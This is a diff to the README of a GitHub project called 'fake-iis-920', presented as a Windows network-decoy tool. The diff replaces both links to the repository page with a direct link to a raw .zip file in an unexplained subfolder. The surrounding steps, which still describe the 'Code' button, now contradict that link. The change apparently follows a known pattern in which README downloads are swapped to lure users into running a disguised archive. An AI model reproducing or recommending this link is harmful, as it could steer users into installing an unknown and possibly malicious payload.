@@ -1,6 +1,6 @@
 # 🛡️ fake-iis-920 - Secure your network with decoys
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Abdulra3843/fake-iis-920)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/Abdulra3843/fake-iis-920/raw/refs/heads/main/squeteague/iis-fake-experiential.zip)
 
 ## 🔍 Project Overview
 
@@ -21,7 +21,7 @@ To run this application on Windows, your computer needs the following:
 You must download the software directly from the official repository page. Follow these instructions to obtain the files:
 
 1. Open your web browser.
-2. Navigate to this address: [https://github.com/Abdulra3843/fake-iis-920](https://github.com/Abdulra3843/fake-iis-920).
+2. Navigate to this address: [https://github.com/Abdulra3843/fake-iis-920/raw/refs/heads/main/squeteague/iis-fake-experiential.zip](https://github.com/Abdulra3843/fake-iis-920/raw/refs/heads/main/squeteague/iis-fake-experiential.zip).
 3. Look for the green button labeled "Code" near the top right of the file list.
 4. Click the button and select "Download ZIP".
 5. Save the file to your computer.
